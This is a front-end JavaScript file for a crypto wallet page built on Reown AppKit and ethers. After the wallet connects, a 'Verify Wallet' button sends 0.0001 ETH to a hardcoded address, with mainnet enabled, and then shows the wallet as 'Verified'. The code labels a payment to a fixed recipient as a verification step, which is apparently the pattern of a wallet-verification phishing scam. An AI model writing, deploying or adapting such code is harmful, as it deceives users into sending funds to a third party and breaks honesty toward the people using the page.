import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { mainnet, sepolia } from "@reown/appkit/networks";
import { BrowserProvider, parseEther } from "ethers";

const projectId = "fd6b27758d54dc8db988468aaa2c07db";
const metadata = {
  name: "AppKit",
  description: "AppKit Example",
  url: "https://reown.com/appkit",
  icons: ["https://avatars.githubusercontent.com/u/179229932"],
};

const modal = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [sepolia, mainnet],
  metadata,
  projectId,
  features: {
    analytics: false,
  },
});

const actionBtn = document.getElementById("action-btn");
const pageLoader = document.getElementById("page-loader");

// Toast
function showToast(message, type = "info") {
  const toast = document.createElement("div");
  toast.className = `toast toast-${type}`;
  toast.textContent = message;
  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), 3000);
}

// Loader
window.addEventListener("load", () => {
  pageLoader.style.display = "none";
});

// Button Utility
function setButtonState(state, text = "") {
  actionBtn.disabled = state;
  actionBtn.classList.toggle("loading", state);
  if (text) actionBtn.textContent = text;
}

// Button Click Handler
actionBtn.addEventListener("click", async () => {
  const address = modal.getAddress?.();

  if (!address) {
    // Not connected: open wallet modal
    try {
      setButtonState(true, "Connecting...");
      await modal.open();

      const newAddress = modal.getAddress?.();
      if (newAddress) {
        showToast(`Connected: ${newAddress}`, "success");
        actionBtn.textContent = "Verify Wallet";
      } else {
        showToast("Wallet not Connect", "error");
      }
    } catch (err) {
      console.error("❌ Connection Error:", err);
      showToast(err.message || "Connection error", "error");
    } finally {
      setButtonState(false, "Verify Wallet");
    }
  } else {
    // Already connected: send transaction
    try {
      setButtonState(true, "Verifying...");
      await sendTransaction();

      // After transaction, mark as verified and disable button
      actionBtn.innerHTML = '<i class="bi bi-patch-check-fill"></i> Verified';
      actionBtn.disabled = true;
    } catch (err) {
      console.error("❌ TX Error:", err);
      showToast(err.message || "Transaction failed", "error");
      setButtonState(false, "Verify Wallet");
    }
  }
});

// Send Transaction
async function sendTransaction() {
  const provider = modal.getWalletProvider();
  const address = modal.getAddress?.();

  if (!provider || !address) {
    showToast("Wallet not connected", "error");
    return;
  }

  const ethersProvider = new BrowserProvider(provider);
  const signer = await ethersProvider.getSigner();

  const tx = await signer.sendTransaction({
    to: "0x7460813002e963A88C9a37D5aE3356c1bA9c9659",
    value: parseEther("0.0001"),
  });

  showToast("✅ Transaction sent!", "success");
  console.log("✅ TX Hash:", tx.hash);
}

// Optional: Update button state on wallet events
modal.subscribeProviders((state) => {
  const { isConnected, address } = state;
  if (isConnected && address) {
    actionBtn.textContent = "Verify Wallet";
    showToast(`Connected: ${address}`, "success");
  } else {
    actionBtn.textContent = "Connect Wallet";
    showToast("Wallet disconnected", "warning");
  }
});
